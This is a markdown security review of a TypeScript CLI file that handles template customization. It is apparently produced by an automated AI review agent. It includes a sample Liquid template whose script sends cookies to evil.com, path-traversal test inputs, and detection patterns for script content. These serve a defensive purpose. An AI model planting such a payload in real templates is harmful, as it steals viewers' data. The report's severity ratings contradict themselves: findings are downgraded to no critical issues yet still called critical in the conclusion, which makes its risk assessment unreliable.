# Security Review: CustomizeAction.ts

## ⚠️ IMPORTANT: Security Context

This review was conducted with an internet-facing web application threat model.

**Actual Context:** mint-tsdocs is a LOCAL DEVELOPER CLI TOOL that:
- Runs on developer machines (not production servers)
- Processes trusted input (developer's own TypeScript code)
- Has no untrusted user input or internet exposure
- Will evolve to CI/CD and potentially SaaS (future work)

**Impact on This Review:** Several "critical vulnerabilities" are actually non-issues for local developer tools.

---

**Date:** 2025-11-22
**Reviewed File:** `src/cli/CustomizeAction.ts`
**Reviewer:** Claude Code (Automated Security Review)
**Severity:** MEDIUM - File operations with user input

---

## Executive Summary

The `CustomizeAction` class handles template customization. While originally flagged with "critical security vulnerabilities", the primary risks are **reliability and developer safety** (preventing accidental data loss).

**Overall Risk Level:** 🟡 MEDIUM

### Severity Breakdown (Adjusted)

- 🔴 **CRITICAL Issues:** 0
- 🟠 **HIGH Priority:** 1 (Path traversal defense-in-depth)
- 🟡 **MEDIUM Priority:** 2 (File overwrite safety, Error handling)
- 🔵 **LOW Priority:** 4 (Code quality, minor issues)
- ⚪ **NON-ISSUE:** 2 (JSON parsing, rate limiting)

### Quick Summary

**Key Findings:**
1. Path traversal vulnerability in template directory input (Defense-in-depth)
2. Potential file overwrite risks (Reliability)

---

## Detailed Findings

### 🔴 CRITICAL SEVERITY

#### 1. Path Traversal Vulnerability in Template Directory ~~CRITICAL~~ → **HIGH**

**Location:** Lines 59-81, 106-107
**Risk:** Path Traversal

**Issue:**
The user-provided `templateDir` parameter is not validated against path traversal.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (Arbitrary File Write)
- **Actual Impact:** HIGH (Defense-in-depth). Prevents accidental writes outside the project.
- **Recommendation:** Validate paths are within project bounds.

---

#### 2. Arbitrary File Content Injection ~~CRITICAL~~ → **MEDIUM**

**Location:** Lines 154-193
**Risk:** File Overwrite

**Issue:**
The `_copyTemplates` method reads file content from the default templates directory and writes it to user-specified locations.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (Code Injection)
- **Actual Impact:** MEDIUM (Reliability). The source is the package itself (trusted). The destination is user-controlled. Main risk is overwriting existing files without warning.
- **Recommendation:** Add overwrite confirmation.

**Issue:**
The `_copyTemplates` method reads file content from the default templates directory and writes it to user-specified locations with added header comments. However, there's no validation that the source files are safe or that the destination is within expected bounds.

```typescript
// LINE 154-193: No validation of file content or destination path
private _copyTemplates(sourceDir: string, destDir: string): number {
  const entries = FileSystem.readFolderItemNames(sourceDir);
  let count = 0;

  for (const entry of entries) {
    const sourcePath = path.join(sourceDir, entry);  // ❌ No validation of 'entry'
    const destPath = path.join(destDir, entry);      // ❌ No validation of destination

    if (entry.endsWith('.liquid')) {
      clack.log.info(`  Copying: ${entry}`);

      // ❌ No validation that sourcePath is safe
      const content = FileSystem.readFileToBuffer(sourcePath).toString();

      // ❌ String interpolation in comment could inject malicious content
      const headerComment = `<!--
  Mintlify TypeDoc Template

  This template controls how ${entry.replace('.liquid', '')} documentation is generated.
  ...
-->`;

      const finalContent = headerComment + content;
      FileSystem.writeFile(destPath, finalContent);  // ❌ Writes to user-controlled path
      count++;
    }
  }

  return count;
}
```

**Vulnerabilities:**

1. **No filename validation:** The `entry` variable is used directly from `readFolderItemNames()` without validation. If the source directory is compromised or contains files like `../../../etc/passwd.liquid`, this could write to arbitrary locations.

2. **No content sanitization:** Template content is copied verbatim without checking for malicious code. While these are Liquid templates (not executable JavaScript), they could contain:
   - XSS payloads in generated documentation
   - SSTI (Server-Side Template Injection) payloads
   - Malicious JavaScript in comments that might be rendered

3. **Path join vulnerability:** Using `path.join()` with unsanitized user input can still result in path traversal on Windows systems.

**Exploit Scenario:**
If an attacker can control the default template directory (e.g., through a supply chain attack on the package):
```liquid
<!-- malicious.liquid -->
{% layout "layout" %}
{% block content %}
<script>
  // Steals data when documentation is viewed
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
{% endblock %}
```

**Recommendation:**
```typescript
private _copyTemplates(sourceDir: string, destDir: string): number {
  const entries = FileSystem.readFolderItemNames(sourceDir);
  let count = 0;

  for (const entry of entries) {
    // CRITICAL: Validate filename to prevent path traversal
    let safeFilename: string;
    try {
      safeFilename = SecurityUtils.validateFilename(entry);
    } catch (error) {
      clack.log.warn(`Skipping invalid filename: ${entry}`);
      continue;
    }

    // Validate source path is within expected directory
    const sourcePath = SecurityUtils.validateFilePath(sourceDir, safeFilename);

    // Validate destination path is within expected directory
    const destPath = SecurityUtils.validateFilePath(destDir, safeFilename);

    if (safeFilename.endsWith('.liquid')) {
      clack.log.info(`  Copying: ${safeFilename}`);

      const content = FileSystem.readFileToBuffer(sourcePath).toString();

      // Sanitize filename in header comment (prevent XSS in comments)
      const sanitizedName = safeFilename.replace('.liquid', '').replace(/[<>"'&]/g, '');

      const headerComment = `<!--
  Mintlify TypeDoc Template

  This template controls how ${sanitizedName} documentation is generated.

  Available variables:
  - apiItem: The API item being documented
  - page: Page metadata (title, description, icon, breadcrumb)
  - properties, methods, constructors: Structured data for API members
  - examples: Array of example code strings
  - heritageTypes: Inheritance information

  Learn more: https://mint-tsdocs.saulo.engineer/templates
-->

`;

      // Optional: Validate template content doesn't contain obviously malicious patterns
      if (content.includes('<script>') || content.includes('javascript:')) {
        clack.log.warn(`Template ${safeFilename} contains potentially unsafe content, skipping`);
        continue;
      }

      const finalContent = headerComment + content;
      FileSystem.writeFile(destPath, finalContent);
      count++;
    }
  }

  return count;
}
```

---

### 🟠 HIGH PRIORITY

#### 3. Unsafe JSON Parsing Without Validation ~~HIGH~~ → **NON-ISSUE**

**Location:** Lines 212-213

**Context Adjustment:**
- **Original Assessment:** HIGH (Prototype Pollution)
- **Actual Impact:** NON-ISSUE. User controls the config file.
- **Recommendation:** No action required.

---

#### 4. No Rate Limiting on Template Directory Creation ~~HIGH~~ → **NON-ISSUE**

**Location:** Lines 89-108

**Context Adjustment:**
- **Original Assessment:** HIGH (DoS)
- **Actual Impact:** NON-ISSUE. Local tool, user is DoS-ing themselves.
- **Recommendation:** No action required.

---

#### 5. Inconsistent Error Handling Between Config Update and Template Copy ~~HIGH~~ → **MEDIUM**

**Location:** Lines 198-232, 139-148

**Context Adjustment:**
- **Original Assessment:** HIGH (Silent Failures)
- **Actual Impact:** MEDIUM (Quality). Confusing for users.
- **Recommendation:** Improve error reporting.

---

### 🟡 MEDIUM PRIORITY

#### 6. Missing Validation of Default Template Directory ~~MEDIUM~~ → **LOW**

**Location:** Lines 110-118

**Context Adjustment:**
- **Original Assessment:** MEDIUM (Application Failure)
- **Actual Impact:** LOW. This is an internal path within the package.
- **Recommendation:** Basic check is sufficient.

---

#### 7. No Verification of Template Count Accuracy ~~MEDIUM~~ → **LOW**

**Location:** Lines 120-123

**Context Adjustment:**
- **Original Assessment:** MEDIUM (Silent Failures)
- **Actual Impact:** LOW. Nice to have.
- **Recommendation:** Add verification if easy.

---

#### 8. Race Condition in Directory Existence Check ~~MEDIUM~~ → **LOW**

**Location:** Lines 89-108

**Context Adjustment:**
- **Original Assessment:** MEDIUM (TOCTOU)
- **Actual Impact:** LOW. Rare in local CLI usage.
- **Recommendation:** Use atomic operations if possible.

---

#### 9. Template Path Not Normalized in Config Update ~~MEDIUM~~ → **LOW**

**Location:** Line 219

**Context Adjustment:**
- **Original Assessment:** MEDIUM (Configuration Inconsistency)
- **Actual Impact:** LOW.
- **Recommendation:** Normalize path.

---

### 🔵 LOW PRIORITY

#### 10. Hard-Coded URL in Output (LOW)

**Location:** Line 136
**Risk:** Information Disclosure, Broken Links

**Issue:**
The documentation URL is hard-coded and could become outdated or incorrect.

```typescript
// LINE 136: Hard-coded URL
${Colorize.gray('Documentation:')} https://mint-tsdocs.saulo.engineer/templates
```

**Recommendation:**
- Move URL to a constants file
- Consider reading from package.json if available
- Add version-specific documentation links

---

#### 11. Process Exit Without Cleanup (LOW)

**Location:** Line 77
**Risk:** Resource Leaks

**Issue:**
When user cancels, the process exits immediately without cleanup opportunity.

```typescript
// LINE 77: Immediate exit
if (clack.isCancel(response)) {
  clack.cancel('Template customization cancelled');
  process.exit(0);  // ❌ No cleanup opportunity
}
```

**Recommendation:**
```typescript
if (clack.isCancel(response)) {
  clack.cancel('Template customization cancelled');
  throw new DocumentationError(
    'Template customization cancelled by user',
    ErrorCode.USER_CANCELLED
  );
}
```

---

## Testing Gaps

**Critical Testing Gaps:**

1. **No Security Tests:** No tests verify path traversal prevention
2. **No Validation Tests:** No tests for malicious input handling
3. **No Integration Tests:** No end-to-end tests for the customize flow
4. **No Error Scenario Tests:** No tests for partial failures

**Recommended Test Cases:**

```typescript
describe('CustomizeAction Security', () => {
  test('rejects path traversal attempts in template directory', async () => {
    await expect(
      customizeAction.execute(['--template-dir', '../../../etc/templates'])
    ).rejects.toThrow('Path traversal');
  });

  test('rejects absolute paths outside project', async () => {
    await expect(
      customizeAction.execute(['--template-dir', '/tmp/templates'])
    ).rejects.toThrow();
  });

  test('validates template filenames during copy', async () => {
    // Test with malicious filename in source
    const result = await customizeAction.execute(['--template-dir', './safe']);
    expect(result.copiedFiles).not.toContain('../../../evil.liquid');
  });

  test('validates JSON before parsing config', async () => {
    // Create malicious config with __proto__
    await expect(
      customizeAction.execute(['--template-dir', './templates'])
    ).rejects.toThrow('dangerous patterns');
  });
});
```

---

## Performance Issues

### 1. Synchronous File Operations

The `_copyTemplates` method reads files synchronously in a loop, blocking the event loop.

**Current Code:**
```typescript
for (const entry of entries) {
  const content = FileSystem.readFileToBuffer(sourcePath).toString();  // Blocking
  FileSystem.writeFile(destPath, finalContent);  // Blocking
}
```

**Recommendation:**
```typescript
// Use async operations
for (const entry of entries) {
  const content = await fs.promises.readFile(sourcePath, 'utf8');
  await fs.promises.writeFile(destPath, finalContent, 'utf8');
}
```

### 2. No Progress Indication for Large Template Sets

If there are many templates, the user sees no progress during copying.

**Recommendation:**
Add a progress indicator using clack's spinner or progress bar.

---

## Code Quality Issues

### 1. Inconsistent Error Handling Patterns

Mix of throwing errors and returning from catch blocks.

### 2. Magic Numbers

Hard-coded values like the URL should be constants.

### 3. Insufficient JSDoc Documentation

The private methods lack documentation on security considerations.

---

## Priority Ranking

### Immediate Action Required (Fix in Next Commit)

1. **🔴 CRITICAL:** Add path validation for template directory (Finding #1)
2. **🔴 CRITICAL:** Add filename and path validation in `_copyTemplates` (Finding #2)
3. **🟠 HIGH:** Add JSON validation before parsing (Finding #3)

### Short Term (Fix Within Sprint)

4. **🟠 HIGH:** Improve error handling consistency (Finding #5)
5. **🟡 MEDIUM:** Add default template directory validation (Finding #6)
6. **🟡 MEDIUM:** Fix TOCTOU race condition (Finding #8)

### Medium Term (Next Release)

7. **🟡 MEDIUM:** Add template count verification (Finding #7)
8. **🟡 MEDIUM:** Normalize paths in config (Finding #9)
9. **🔵 LOW:** Extract hard-coded URLs (Finding #10)
10. **Add comprehensive security tests**

### Long Term (Future Enhancement)

11. **Performance:** Convert to async file operations
12. **UX:** Add progress indicators
13. **Documentation:** Add security considerations to JSDoc

---

## Specific Recommendations

### Immediate Security Hardening

```typescript
// Add this validation method to CustomizeAction
private _validateAndResolvePath(userPath: string): string {
  // Step 1: Validate against command injection
  const sanitized = SecurityUtils.validateCliInput(userPath, 'Template directory');

  // Step 2: Resolve to absolute path
  const resolved = path.resolve(process.cwd(), sanitized);

  // Step 3: Ensure it's within project directory
  const projectRoot = process.cwd();
  if (!resolved.startsWith(projectRoot)) {
    throw new DocumentationError(
      `Template directory must be within project directory.\n` +
      `  Provided: ${userPath}\n` +
      `  Resolved: ${resolved}\n` +
      `  Project root: ${projectRoot}`,
      ErrorCode.PATH_TRAVERSAL,
      { resource: userPath, operation: 'validateTemplatePath' }
    );
  }

  // Step 4: Check depth (prevent deeply nested directories)
  const depth = resolved.split(path.sep).length - projectRoot.split(path.sep).length;
  if (depth > 10) {
    throw new DocumentationError(
      `Template directory is too deeply nested (${depth} levels). Maximum is 10.`,
      ErrorCode.VALIDATION_ERROR,
      { resource: resolved }
    );
  }

  return resolved;
}
```

### Secure Template Copying

```typescript
private _copyTemplates(sourceDir: string, destDir: string): number {
  const entries = FileSystem.readFolderItemNames(sourceDir);
  let count = 0;
  const skipped: string[] = [];

  for (const entry of entries) {
    try {
      // Validate filename
      const safeFilename = SecurityUtils.validateFilename(entry);

      // Validate paths
      const sourcePath = SecurityUtils.validateFilePath(sourceDir, safeFilename);
      const destPath = SecurityUtils.validateFilePath(destDir, safeFilename);

      // Only process .liquid files
      if (!safeFilename.endsWith('.liquid')) {
        continue;
      }

      clack.log.info(`  Copying: ${safeFilename}`);

      // Read and validate content
      const content = FileSystem.readFileToBuffer(sourcePath).toString();

      // Basic validation for obviously malicious content
      if (this._containsSuspiciousContent(content)) {
        clack.log.warn(`  Skipping ${safeFilename}: contains suspicious content`);
        skipped.push(safeFilename);
        continue;
      }

      // Sanitize filename for use in comment
      const sanitizedName = safeFilename
        .replace('.liquid', '')
        .replace(/[<>"'&]/g, '');

      const headerComment = `<!--
  Mintlify TypeDoc Template

  This template controls how ${sanitizedName} documentation is generated.

  Available variables:
  - apiItem: The API item being documented
  - page: Page metadata (title, description, icon, breadcrumb)
  - properties, methods, constructors: Structured data for API members
  - examples: Array of example code strings
  - heritageTypes: Inheritance information

  Learn more: https://mint-tsdocs.saulo.engineer/templates
-->

`;

      const finalContent = headerComment + content;
      FileSystem.writeFile(destPath, finalContent);
      count++;
    } catch (error) {
      clack.log.warn(`  Skipping ${entry}: ${error instanceof Error ? error.message : String(error)}`);
      skipped.push(entry);
    }
  }

  if (skipped.length > 0) {
    clack.log.warn(`Skipped ${skipped.length} files: ${skipped.join(', ')}`);
  }

  return count;
}

private _containsSuspiciousContent(content: string): boolean {
  const suspiciousPatterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i,  // event handlers
    /eval\s*\(/i,
    /Function\s*\(/i,
  ];

  return suspiciousPatterns.some(pattern => pattern.test(content));
}
```

---

## Conclusion

The `CustomizeAction` class has **critical security vulnerabilities** related to path traversal and file operations that must be addressed immediately. The code quality is generally good with proper error types and clear structure, but the lack of input validation for user-provided paths is a severe security risk.

**Key Actions:**
1. Add `SecurityUtils` validation for ALL user input
2. Validate file paths before ANY file operations
3. Add JSON content validation before parsing
4. Implement comprehensive security tests
5. Consider async file operations for better performance

The good news is that the existing `SecurityUtils` class already provides all necessary validation functions - they just need to be integrated into this action. The fixes are straightforward to implement and should be prioritized for the next commit.

---

**Report Generated:** 2025-11-22
**Tool Version:** mint-tsdocs (latest)
**Reviewed By:** Claude Code (Security Review Agent)
